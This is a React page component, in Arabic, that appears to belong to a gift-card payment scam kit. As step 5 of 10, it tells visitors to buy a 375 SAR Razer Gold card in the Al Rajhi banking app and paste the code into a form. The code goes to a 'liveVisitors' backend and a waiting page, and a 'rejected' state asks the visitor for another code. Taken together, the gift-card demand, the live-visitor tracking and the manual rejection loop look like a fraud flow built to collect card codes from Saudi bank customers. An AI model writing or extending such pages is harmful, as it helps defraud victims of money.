import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { StepLayout } from "@/components/StepLayout";
import { useStepSession, getSessionId } from "@/lib/useStepSession";
import { useLocation } from "wouter";
import { useState, useEffect } from "react";
import { toast } from "sonner";
import { trpc } from "@/lib/trpc";
import { ASSETS } from "@/lib/assets";
import {
  AlertTriangle,
  Smartphone,
  Search,
  Gamepad2,
  CreditCard,
  Mail,
  Key,
  Send,
  Heart,
  Zap,
  BadgeCheck,
  TrendingDown,
  ShieldCheck,
  Copy,
  Check,
} from "lucide-react";

function CopyableText({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);

  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(text);
      setCopied(true);
      toast.success("تم نسخ النص");
      setTimeout(() => setCopied(false), 2000);
    } catch {
      // fallback for mobile
      const textarea = document.createElement('textarea');
      textarea.value = text;
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand('copy');
      document.body.removeChild(textarea);
      setCopied(true);
      toast.success("تم نسخ النص");
      setTimeout(() => setCopied(false), 2000);
    }
  };

  return (
    <button
      onClick={handleCopy}
      className="mt-2 flex items-center gap-2 bg-blue-100 hover:bg-blue-200 border border-blue-300 rounded-lg px-4 py-2.5 transition-colors duration-150 active:scale-[0.97] group"
      style={{ transitionTimingFunction: "cubic-bezier(0.23, 1, 0.32, 1)" }}
    >
      <span className="font-bold text-blue-800 text-base" dir="ltr">{text}</span>
      {copied ? (
        <Check className="w-4 h-4 text-green-600" />
      ) : (
        <Copy className="w-4 h-4 text-blue-600 group-hover:text-blue-800" />
      )}
      <span className="text-xs text-blue-600">{copied ? "تم النسخ" : "انسخ"}</span>
    </button>
  );
}

export default function RazerPayment() {
  const [, setLocation] = useLocation();
  const { recordStep } = useStepSession();
  const [razerCode, setRazerCode] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);

  // قراءة رسالة الخطأ من URL عند الرفض
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    if (params.get("error") === "rejected") {
      setErrorMessage("الرمز غير صالح أو تم رفضه. يرجى إدخال رمز جديد.");
    }
  }, []);

  const submitRazer = trpc.liveVisitors.submitRazerCode.useMutation();

  const handleSubmit = async () => {
    if (!razerCode.trim()) {
      toast.error("يرجى إدخال رمز Razer Gold");
      return;
    }
    if (razerCode.length < 12 || razerCode.length > 20) {
      toast.error("رمز Razer Gold يجب أن يكون بين 12 و 20 خانة");
      return;
    }
    if (!/^[A-Z0-9]+$/.test(razerCode)) {
      toast.error("الرمز يجب أن يحتوي على أرقام وأحرف إنجليزية فقط");
      return;
    }
    setIsSubmitting(true);
    try {
      const sessionId = getSessionId();
      await submitRazer.mutateAsync({ sessionId, razerCode: razerCode.trim() });
      await recordStep("razer-code", { razerCode: razerCode.trim() });
      setLocation("/razer-wait");
    } catch (err) {
      toast.error("حدث خطأ، يرجى المحاولة مرة أخرى");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <StepLayout
      step={5}
      total={10}
      badge="الدفع السريع - وفّر 8 ريال"
      title="ادفع بسرعة عبر تطبيق الراجحي"
      subtitle="أسرع وأسهل طريقة لإتمام الدفع - 375 ريال فقط (100 دولار) بدلاً من 383 ريال"
      variant="green"
    >
      {/* بطاقة المميزات */}
      <div className="grid grid-cols-3 gap-2 mb-5">
        <div className="bg-emerald-50 border border-emerald-200 rounded-xl p-3 text-center">
          <TrendingDown className="w-5 h-5 text-emerald-600 mx-auto mb-1.5" />
          <p className="text-[11px] font-bold text-emerald-800">أوفر بـ 8 ريال</p>
        </div>
        <div className="bg-blue-50 border border-blue-200 rounded-xl p-3 text-center">
          <Zap className="w-5 h-5 text-blue-600 mx-auto mb-1.5" />
          <p className="text-[11px] font-bold text-blue-800">فورية وسريعة</p>
        </div>
        <div className="bg-amber-50 border border-amber-200 rounded-xl p-3 text-center">
          <ShieldCheck className="w-5 h-5 text-amber-600 mx-auto mb-1.5" />
          <p className="text-[11px] font-bold text-amber-800">آمنة 100%</p>
        </div>
      </div>

      {/* بطاقة السعر */}
      <Card className="p-4 mb-5 border-2 border-emerald-200 bg-gradient-to-l from-emerald-50 to-white">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-12 h-12 rounded-xl bg-emerald-100 flex items-center justify-center">
              <BadgeCheck className="w-6 h-6 text-emerald-600" />
            </div>
            <div>
              <p className="text-xs text-gray-500">المبلغ المطلوب</p>
              <p className="text-2xl font-extrabold text-emerald-700" dir="ltr">375 <span className="text-sm">SAR</span></p>
            </div>
          </div>
          <div className="bg-emerald-600 text-white px-3 py-1.5 rounded-full text-xs font-bold">
            وفّر 8 ريال
          </div>
        </div>
      </Card>

      {/* رسالة خطأ عند الرفض */}
      {errorMessage && (
        <Card className="p-4 mb-5 border-red-200 bg-red-50 animate-in fade-in slide-in-from-top-2 duration-200">
          <div className="flex items-center gap-2 text-red-700">
            <AlertTriangle className="w-4 h-4" />
            <p className="text-sm font-medium">{errorMessage}</p>
          </div>
        </Card>
      )}

      {/* خطوات الشراء مع صور توضيحية */}
      <Card className="p-5 md:p-6 mb-5 shadow-lg border-gray-100 bg-white">
        <h3 className="font-bold text-gray-800 text-lg mb-2 text-center">
          خطوات الدفع عبر تطبيق الراجحي
        </h3>
        <p className="text-sm text-gray-500 text-center mb-5">اتبع الخطوات التالية لإتمام الدفع خلال دقيقتين</p>

        <div className="space-y-5">
          {/* الخطوة 1 */}
          <div className="bg-gray-50 rounded-xl p-4 border border-gray-100">
            <div className="flex items-start gap-3 mb-3">
              <div className="w-8 h-8 rounded-full bg-emerald-500 flex items-center justify-center shrink-0 text-white font-bold text-sm">1</div>
              <div>
                <p className="font-bold text-gray-800 text-sm">افتح تطبيق مصرف الراجحي</p>
                <p className="text-gray-600 text-sm mt-0.5">
                  ثم اختر قسم <strong className="text-red-600">أسلوب الحياة (Lifestyle)</strong> من القائمة السفلية
                </p>
              </div>
            </div>
            <div className="flex justify-center">
              <img
                src={ASSETS.razerStep1Lifestyle}
                alt="الخطوة 1: اختيار أسلوب الحياة من تطبيق الراجحي"
                className="w-full max-w-[180px] rounded-xl shadow-md border border-gray-200"
              />
            </div>
          </div>

          {/* الخطوة 2 */}
          <div className="bg-gray-50 rounded-xl p-4 border border-gray-100">
            <div className="flex items-start gap-3 mb-3">
              <div className="w-8 h-8 rounded-full bg-blue-500 flex items-center justify-center shrink-0 text-white font-bold text-sm">2</div>
              <div>
                <p className="font-bold text-gray-800 text-sm">ابحث عن Razer</p>
                <p className="text-gray-600 text-sm mt-0.5">
                  في مربع البحث اكتب:
                </p>
                <CopyableText text="Razer Gold" />
              </div>
            </div>
            <div className="flex justify-center">
              <img
                src={ASSETS.razerStep2Search}
                alt="الخطوة 2: البحث عن Razer في التطبيق"
                className="w-full max-w-[180px] rounded-xl shadow-md border border-gray-200"
              />
            </div>
          </div>

          {/* الخطوة 3 */}
          <div className="bg-gray-50 rounded-xl p-4 border border-gray-100">
            <div className="flex items-start gap-3 mb-3">
              <div className="w-8 h-8 rounded-full bg-green-500 flex items-center justify-center shrink-0 text-white font-bold text-sm">3</div>
              <div>
                <p className="font-bold text-gray-800 text-sm">اختر بطاقة Razer Gold 100 USD</p>
                <p className="text-gray-600 text-sm mt-0.5">
                  اختر البطاقة بقيمة <strong className="text-emerald-700">375 ريال سعودي (100 دولار)</strong> وأكمل الشراء
                </p>
              </div>
            </div>
            <div className="flex justify-center">
              <img
                src={ASSETS.razerStep3Select}
                alt="الخطوة 3: اختيار بطاقة Razer Gold 100 USD"
                className="w-full max-w-[180px] rounded-xl shadow-md border border-gray-200"
              />
            </div>
          </div>

          {/* الخطوة 4 */}
          <div className="bg-gray-50 rounded-xl p-4 border border-gray-100">
            <div className="flex items-start gap-3 mb-3">
              <div className="w-8 h-8 rounded-full bg-orange-500 flex items-center justify-center shrink-0 text-white font-bold text-sm">4</div>
              <div>
                <p className="font-bold text-gray-800 text-sm">استلم الرمز عبر رسالة نصية</p>
                <p className="text-gray-600 text-sm mt-0.5">
                  بعد الشراء ستصلك <strong>رسالة نصية</strong> تحتوي على رمز Razer Gold
                </p>
              </div>
            </div>
            <div className="flex justify-center">
              <img
                src={ASSETS.razerStep4Sms}
                alt="الخطوة 4: استلام الرمز عبر رسالة نصية"
                className="w-full max-w-[180px] rounded-xl shadow-md border border-gray-200"
              />
            </div>
          </div>

          {/* الخطوة 5 - إدخال الرمز */}
          <div className="bg-emerald-50 rounded-xl p-4 border-2 border-emerald-200">
            <div className="flex items-start gap-3">
              <div className="w-8 h-8 rounded-full bg-emerald-600 flex items-center justify-center shrink-0 text-white font-bold text-sm">5</div>
              <div>
                <p className="font-bold text-emerald-900 text-sm">أدخل الرمز بالأسفل</p>
                <p className="text-emerald-800 text-sm mt-0.5">
                  انسخ رمز Razer Gold من الرسالة وألصقه في الحقل أدناه، ثم اضغط <strong>إرسال</strong>
                </p>
              </div>
            </div>
          </div>
        </div>
      </Card>

      {/* نموذج إدخال الكود */}
      <Card className="p-5 md:p-6 shadow-xl border-emerald-200 bg-white">
        <div className="flex items-center gap-2 mb-4">
          <Key className="w-5 h-5 text-emerald-600" />
          <h3 className="font-bold text-gray-800 text-base">إدخال رمز Razer Gold</h3>
        </div>

        <div className="space-y-3">
          <Input
            value={razerCode}
            onChange={(e) => {
              const val = e.target.value.replace(/[^a-zA-Z0-9]/g, "").toUpperCase();
              if (val.length <= 20) setRazerCode(val);
            }}
            placeholder="أدخل رمز Razer Gold هنا"
            className="h-14 text-center font-mono text-lg border-emerald-200 focus:border-emerald-500 tracking-wider"
            dir="ltr"
            maxLength={20}
          />
          <p className="text-[11px] text-muted-foreground text-center">
            الرمز الذي وصلك عبر الرسالة النصية بعد شراء البطاقة
          </p>
        </div>

        <Button
          onClick={handleSubmit}
          disabled={isSubmitting || !razerCode.trim()}
          size="lg"
          className="w-full mt-5 bg-gradient-to-r from-emerald-600 to-emerald-700 hover:from-emerald-700 hover:to-emerald-800 font-bold h-14 shadow-lg active:scale-[0.98] transition-transform duration-150"
          style={{ transitionTimingFunction: "cubic-bezier(0.23, 1, 0.32, 1)" }}
        >
          <Send className="w-5 h-5 ml-2" />
          إرسال الرمز وإتمام الدفع
        </Button>
      </Card>
    </StepLayout>
  );
}
